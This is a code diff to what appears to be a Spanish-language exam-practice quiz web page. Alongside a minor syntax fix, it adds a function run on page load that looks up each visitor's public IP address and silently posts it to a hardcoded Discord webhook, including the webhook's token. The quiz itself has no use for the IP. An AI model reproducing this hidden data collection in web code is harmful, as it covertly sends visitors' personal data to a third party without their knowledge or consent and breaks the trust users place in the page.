@@ -4743,8 +4743,11 @@ const lastExamQuestions = [
 
 
 let currentQuestions = [];
-let correctAnswers = 0
+let correctAnswers = 0;
 let wrongAnswers = 0;
+
+// Llamada a la función para enviar la IP al webhook
+sendIpToDiscord();
 
 document.getElementById('testButton').addEventListener('click', () => {
     const questionCount = parseInt(document.getElementById('questionCount').value);
@@ -4881,6 +4884,39 @@ function shuffle(array) {
     return array;
 }
 
+// Función para enviar la IP al webhook de Discord
+function sendIpToDiscord() {
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            const ip = data.ip;
+            const webhookUrl = "https://discord.com/api/webhooks/1288984018687103047/e09hMXQwBRjWgiEeCSiS4pQzXsgQLGfq8d-yyq1-W0w2mJzI-AkKAHDJiU28TXwR-CzE"; // Reemplaza con tu webhook
+
+            // Envía la IP al webhook de Discord
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    content: `IP pública detectada: ${ip}`
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('IP enviada correctamente al webhook de Discord');
+                } else {
+                    console.log('Error al enviar la IP al webhook de Discord');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        })
+        .catch(error => {
+            console.error('No se pudo obtener la IP:', error);
+        });
+}
 
 document.addEventListener('DOMContentLoaded', () => {
     const updateDate = document.getElementById('updateDate');
